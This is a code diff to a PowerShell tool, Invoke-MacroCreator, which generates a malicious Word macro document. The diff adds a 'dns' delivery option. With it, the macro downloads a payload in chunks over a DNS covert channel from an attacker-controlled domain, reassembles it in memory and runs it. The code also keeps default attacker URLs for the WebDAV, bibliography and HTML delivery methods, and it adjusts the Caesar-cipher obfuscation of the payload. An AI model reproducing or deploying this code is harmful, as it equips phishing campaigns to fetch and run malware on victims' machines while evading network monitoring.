@@ -30,6 +30,11 @@ function Invoke-MacroCreator {
 		5. HTML, using IE:
 			The payload is embedded into a simple HTML file and then loaded over HTTP(S) from an Internet Explorer COM object. The generated 'index.html' file must be hosted on a web server.
 			The process seen performing network traffic is 'iexplorer.exe'
+		6. DNS devliery:
+			The payload is downloaded over a DNS request covert channel, in several chunks that are reassembled in memory.
+			It is required to own a domain name and to use the [@DNSDelivery](https://github.com/Arno0x/DNSDelivery) tool. 
+			When using DNSDelivery with Invoke-MacroCreator, the type of payload to deliver doesn't matter as it is not consummed by the macro.
+			In other words: set it to whatever you want.
 	
 	When a command is to be executed (File or Command payload), three different methods are available that can be choosen using the '-m' switch.
 	
@@ -52,14 +57,18 @@ function Invoke-MacroCreator {
 		
 	.PARAMETER delivery
 		[Mandatory]
-		The payload delivery method. Values: comment|body|webdav|html|biblio
+		The payload delivery method. Values: comment|body|webdav|html|biblio|dns
 	
 	.PARAMETER url
 		[Optionnal]
 		If the delivery method is 'webdav', the IP or FQDN to be used in the UNC path.
 		If the delivery method is 'biblio', the full URL to download the generated 'sources.xml'
 		If the delivery method is 'html', the full URL to download the generated 'index.html'
-		
+	
+	.PARAMETER domainName
+		[Optionnal]
+		If the delivery method is 'dns', the domain name to be used for the DNS resolution covert channel.
+	
 	.PARAMETER command
 		[Optionnal]
 		If the payload type is a 'file', the command line required to execute the file. It basically tells how to launch the file.
@@ -115,7 +124,7 @@ function Invoke-MacroCreator {
 		
 		[Parameter(Mandatory = $True, HelpMessage="Payload delivery method")]
 		[Alias('d')]
-		[ValidateSet('webdav', 'biblio', 'html', 'body', 'comment')]
+		[ValidateSet('webdav', 'biblio', 'html', 'dns', 'body', 'comment')]
         [string]$delivery,
 
 		[Parameter(HelpMessage="Payload URL. Can be a 'WebDavDelivery' IP/FQDN or a 'biblio sources' URL")]
@@ -123,6 +132,11 @@ function Invoke-MacroCreator {
 		[ValidateNotNullOrEmpty()]
         [string]$url,
 		
+		[Parameter(HelpMessage="Domain name to be used with the DNS delivery method")]
+		[Alias('dn')]
+		[ValidateNotNullOrEmpty()]
+        [string]$domainName,
+
 		[Parameter(HelpMessage="Final command to use to execute the 'file' payload")]
 		[Alias('c')]
 		[ValidateNotNullOrEmpty()]
@@ -149,9 +163,10 @@ function Invoke-MacroCreator {
 	
 	#----------------------------------------------------------------------------------------
 	# Global variables
-	$DEFAULT_WEBDAVDELIVERY = "192.168.52.134"
-	$DEFAULT_BIBLIO_URL = "http://192.168.52.134:8000/sources.xml"
-	$DEFAULT_INDEX_URL = "http://192.168.52.134:8000/index.html"
+	$DEFAULT_WEBDAVDELIVERY = "192.168.52.134" # Used with 'webdav' delivery method
+	$DEFAULT_BIBLIO_URL = "http://192.168.52.134:8000/sources.xml" # Used with 'biblio' delivery method
+	$DEFAULT_INDEX_URL = "http://192.168.52.134:8000/index.html" # Used with 'html' delivery method
+	$DEFAULT_DOMAINNAME = "mydomain.com" # Used with 'dns' delivery method
 	$DEFAULT_MARKER = "Conclusion"
 	
 	$outWordFile = "$pwd\malicious.docm"
@@ -190,6 +205,15 @@ function Invoke-MacroCreator {
 		} 
 	}
 	
+	if ($delivery -eq 'dns') {
+		$requireMSXML = $True
+		if (!$domainName) {
+			$domainName = $DEFAULT_DOMAINNAME
+			Write-Host -ForegroundColor Blue "[*] No domain name specified. Using the default one [$domainName]"
+		}
+		Write-Host -ForegroundColor Blue "[*] You must make the file [$fileName] downloadable using the DNSDelivery Tool (https://github.com/Arno0x/DNSDelivery)"
+	}
+	
 	if ($delivery -eq 'comment') {
 		$requireMSXML = $True
 	}
@@ -218,7 +242,7 @@ function Invoke-MacroCreator {
 	}
 	
 	# Create random Caesar key if obfuscation is required
-	if ($obfuscate) { $caesarKey = RandomInt 0 94 }	else {$caesarKey = 0}
+	if ($obfuscate) { $caesarKey = RandomInt 1 94 }	else {$caesarKey = 0}
 		
 	#----------------------------------------------------------------------------------------
 	# Import Templates definition
@@ -342,6 +366,14 @@ function Invoke-MacroCreator {
 		$functionsCode += $downloadURLWithIE
 		$mainCode += "`tDim _payload_() As Byte`n"
 		$mainCode += "`t_payload_ = #DownloadURLWithIE#(-`"$payloadURL`"-)`n"
+	}
+	
+	elseif ($delivery -eq 'dns') {
+		$headersCode += $downloadFromDNSHeaders
+		$functionsCode += $base64Decode
+		$functionsCode += $downloadFromDNS
+		$mainCode += "`tDim _payload_() As Byte`n"
+		$mainCode += "`t_payload_ = #DownloadFromDNS#(-`"$domainName`"-)`n"
 	}
 	
 	#---- BLOCK 4: Do something with the payload depending on its type
